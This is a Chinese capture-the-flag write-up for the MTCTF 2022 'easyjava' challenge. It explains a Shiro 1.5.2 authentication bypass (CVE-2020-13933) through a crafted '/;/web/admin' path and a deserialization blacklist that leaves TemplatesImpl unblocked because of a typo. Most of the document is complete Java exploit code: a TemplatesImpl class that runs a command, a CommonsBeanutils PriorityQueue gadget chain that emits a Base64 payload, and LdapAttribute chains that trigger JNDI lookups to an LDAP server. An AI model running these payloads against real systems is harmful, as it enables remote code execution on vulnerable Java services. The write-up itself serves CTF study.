# easyjava

[MTCTF 2022easyjava | NSSCTF (ctfer.vip)](https://www.ctfer.vip/problem/3463)

## Shiro绕过+CB链

```xml
<!--Shiro框架-->
<dependency>
    <groupId>org.apache.shiro</groupId>
    <artifactId>shiro-spring</artifactId>
    <version>1.5.2</version>
</dependency>
<!--hibernate-->
<dependency>
    <groupId>org.hibernate</groupId>
    <artifactId>hibernate-core</artifactId>
    <version>4.3.8.Final</version>
</dependency>
```

`Shiro`版本`1.5.2`，存在认证鉴权绕过方式

**CVE-2020-13933**

影响版本：`shiro < 1.6.0`

当请求中出现了 `;` 的 URL 编码 `%3b` 时

* shiro 会 url 解码成 `;`，然后截断后面的内容，进行匹配，例如 `/audit/aaa%3baaa` -> `/audit/aaa`。

- spring & tomcat 会处理成 `/audit/aaa;aaa`。

> 注意这个application.properties里指定了上下文路径
>
> `server.servlet.context-path=/web`

`ShiroConfig`设置了过滤规则：

```java
filterMap.put("/", "anon");
filterMap.put("/login", "anon");
filterMap.put("/admin/*", "authc");
```

`/;/web/admin/hello`可绕过

```java
@RequestMapping({"/admin/hello"})
public String admin(@RequestParam(name = "data",required = false) String data, Model model) throws Exception {
    try {
        byte[] decode = Base64.getDecoder().decode(data);
        InputStream inputStream = new ByteArrayInputStream(decode);
        MyObjectInputStream myObjectInputStream = new MyObjectInputStream(inputStream);
        myObjectInputStream.readObject();
    } catch (Exception var6) {
        var6.printStackTrace();
        model.addAttribute("msg", "data=");
    }

    return "admin/hello";
}
```

`MyObjectInputStream`重写了`ObjectInputStream`的`resolveClass`方法

```java
public class MyObjectInputStream extends ObjectInputStream {
    private static ArrayList<String> blackList = new ArrayList();

    public MyObjectInputStream(InputStream inputStream) throws Exception {
        super(inputStream);
    }

    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        Iterator var2 = blackList.iterator();

        String s;
        do {
            if (!var2.hasNext()) {
                return super.resolveClass(desc);
            }

            s = (String)var2.next();
        } while(!desc.getName().contains(s));

        throw new ClassNotFoundException("Don't hacker!");
    }

    static {
        blackList.add("com.sun.org.apache.xalan.internal.xsltc.traxTemplatesImpl");
        blackList.add("org.hibernate.tuple.component.PojoComponentTuplizer");
        blackList.add("java.security.SignedObject");
        blackList.add("com.sun.rowset.JdbcRowSetImpl");
    }
}
```

出题人不知道是故意的还是不小心的，`traxTemplatesImpl`少了个`.`

那就直接打Shiro的CB链了

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class Evil extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.beanutils.BeanComparator;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

public class Test

{
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main( String[] args ) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{
                ClassPool.getDefault().get(Evil.class.getName()).toBytecode()
        });
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("2");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        Base64Encode(barr);
    }
    private static String Base64Encode(ByteArrayOutputStream bs){
        byte[] encode = Base64.getEncoder().encode(bs.toByteArray());
        String s = new String(encode);
        System.out.println(s);
        System.out.println(s.length());
        return s;
    }
}
```

## LdapAttribute#getAttributeDefinition

```java
import org.apache.commons.beanutils.BeanComparator;

import javax.naming.CompositeName;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

public class LdapExp {
    public static void setFieldValue(Object obj, String fieldName, Object newValue) throws Exception {
        Class clazz = obj.getClass();
        Field field = clazz.getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, newValue);
    }

    public static void main(String[] args) throws Exception {
        Class ldapAttributeClazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
        Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(
                new Class[] {String.class});
        ldapAttributeClazzConstructor.setAccessible(true);
        Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(
                new Object[] {"name"});
        setFieldValue(ldapAttribute, "baseCtxURL", "ldap://127.0.0.1:8099/");
        setFieldValue(ldapAttribute, "rdn", new CompositeName("a//b"));

        BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue pq = new PriorityQueue(comparator);
        setFieldValue(pq, "size", 2);
        setFieldValue(comparator, "property", "attributeDefinition");
        setFieldValue(pq, "queue", new Object[]{ldapAttribute, ldapAttribute});

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(pq);
        oos.close();
        String encoded = Base64.getEncoder().encodeToString(barr.toByteArray());
        System.out.println(encoded);
    }
}
```

若`java.util.PriorityQueue`也被禁了

```java
Class ldapAttributeClazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(
    new Class[] {String.class});
ldapAttributeClazzConstructor.setAccessible(true);
Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(
    new Object[] {"name"});
setFieldValue(ldapAttribute, "baseCtxURL", "ldap://127.0.0.1:8099/");
setFieldValue(ldapAttribute, "rdn", new CompositeName("a//b"));

BeanComparator comparator = new BeanComparator("class");

TreeMap treeMap1 = new TreeMap(comparator);
treeMap1.put(ldapAttribute, "aaa");
TreeMap treeMap2 = new TreeMap(comparator);
treeMap2.put(ldapAttribute, "aaa");
HashMap hashMap = new HashMap();
hashMap.put(treeMap1, "bbb");
hashMap.put(treeMap2, "ccc");

comparator.setProperty("attributeDefinition");

ByteArrayOutputStream barr = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(barr);
oos.writeObject(hashMap);
oos.close();

ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
Object o = (Object) ois.readObject();
```

`java.lang.NoSuchMethodException: Unknown property 'class' on class 'class com.sun.jndi.ldap.LdapAttribute'`，可能是因为这个类是final的缘故，后面遇到再看吧。。。
